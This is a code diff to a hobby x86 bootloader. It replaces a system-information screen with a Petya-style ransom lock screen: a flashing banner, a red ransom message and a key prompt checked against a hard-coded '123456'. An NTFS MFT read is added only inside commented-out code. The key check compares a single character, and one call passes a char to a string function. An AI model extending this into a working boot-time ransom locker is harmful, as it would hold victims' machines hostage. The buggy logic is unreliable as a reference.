@@ -6,6 +6,7 @@
 #include "petya.h"
 #include "keyboard.h"
 #include "types.h"
+#include "ntfs.h"
 
 #define VGA_BASE ((volatile uint16_t *)0xB8000)
 #define VGA_COLS 80
@@ -255,73 +256,55 @@ void vga_put_hex(uint32_t n)
 
 void bootloader_main(uint32_t boot_drive)
 {
+    int flag = 0;
+    while (1)
+    {
+        vga_clear();
+
+        vga_set_color(flag == 0 ? COLOR_WHITE_ON_BLACK : COLOR_WHITE_ON_RED);
+        flag = flag == 0 ? 1 : 0;
+
+        vga_draw_centered_ascii("NiHaHaHaHa!\n(Press any key to resume)");
+
+        if (keyboard_hashkey())
+            break;
+
+        for (int i = 0; i < 200000; i++);
+    }
+
     vga_clear();
 
-    vga_set_color(COLOR_WHITE_ON_BLUE);
-    vga_puts("OpenBootloader v0.1  -  Stage 2 Bootloader (32-bit Protected Mode)");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-    vga_putchar('\n');
+    vga_set_color(COLOR_RED_ON_BLACK);
+    vga_puts(RANSOM_MSG);
 
-    vga_putchar('\n');
-    vga_set_color(COLOR_CYAN_ON_BLACK);
-    vga_puts("[CPU]\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
+    const char *petya_key = "123456";
 
-    char vendor[13];
-    get_cpu_vendor(vendor);
-    vga_puts("Vendor: "); vga_puts(vendor); vga_putchar('\n');
+    keyboard_getchar();
 
-    uint32_t max_leaf;
-    __asm__ volatile ("cpuid" : "=a"(max_leaf) : "a"(0) : "ebx", "ecx", "edx");
-    vga_puts("Max CPUID leaf: "); vga_put_hex(max_leaf); vga_putchar('\n');
+    while (1)
+    {
+        vga_putchar('\n');
+        vga_puts("Enter key: ");
+        char key[64];
 
-    vga_putchar('\n');
-    vga_set_color(COLOR_CYAN_ON_BLACK);
-    vga_puts("[Boot]\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-    vga_puts("Boot drive: ");
-    vga_put_hex(boot_drive);
-    vga_puts(boot_drive >= 0x80 ? "(Hard Disk)\n" : "(Floppy)\n");
+        keyboard_readline(key, sizeof(key));
 
-    vga_putchar('\n');
-    vga_set_color(COLOR_CYAN_ON_BLACK);
-    vga_puts("[Memory Layout]\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-    vga_puts("0x00007C00  MBR (512 bytes)\n");
-    vga_puts("0x00008000  Stage2 Bootloader  <-- I am here!\n");
-    vga_puts("0x00090000  Stack top\n");
-    vga_puts("0x00100000  Kernel load target\n");
+        if (*petya_key == *key)
+        {
+            vga_puts("YES!");
+            break;
+        }
 
-    vga_putchar('\n');
-    vga_set_color(COLOR_CYAN_ON_BLACK);
-    vga_puts("[Kernel Loading]\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-    vga_puts("Loading kernel...");
-
-    vga_puts("[");
-    vga_set_color(COLOR_GREEN_ON_BLACK);
-    for (int i = 0; i < 32; i++) {
-        for (volatile int j = 0; j < 200000; j++);
-        vga_putchar('#');
+        vga_puts("GO AWAY!\n");
+        vga_puts('\n');
     }
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-    vga_puts("]\n");
 
-    vga_set_color(COLOR_GREEN_ON_BLACK);
-    vga_puts("Done!\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-
-    vga_putchar('\n');
-    draw_line();
-    vga_set_color(COLOR_YELLOW_ON_BLACK);
-    vga_puts("\nKernel would start here. System halted.\n");
-    vga_set_color(COLOR_WHITE_ON_BLACK);
-
-    //vga_set_color(COLOR_WHITE_ON_RED);
-    //print_petya_art();
-
+    /*
+    vga_clear();
     vga_set_color(COLOR_RED_ON_BLACK);
     print_petya_art();
+
+    ntfs_read_mft(2048);
 
     vga_putchar('\n');
 
@@ -330,6 +313,8 @@ void bootloader_main(uint32_t boot_drive)
     keyboard_readline(key, sizeof(key));
 
     vga_puts("\nOK!\n");
+
+    */
 
     __asm__ volatile ("cli\n.Lhang: hlt\njmp .Lhang\n");
     __builtin_unreachable();
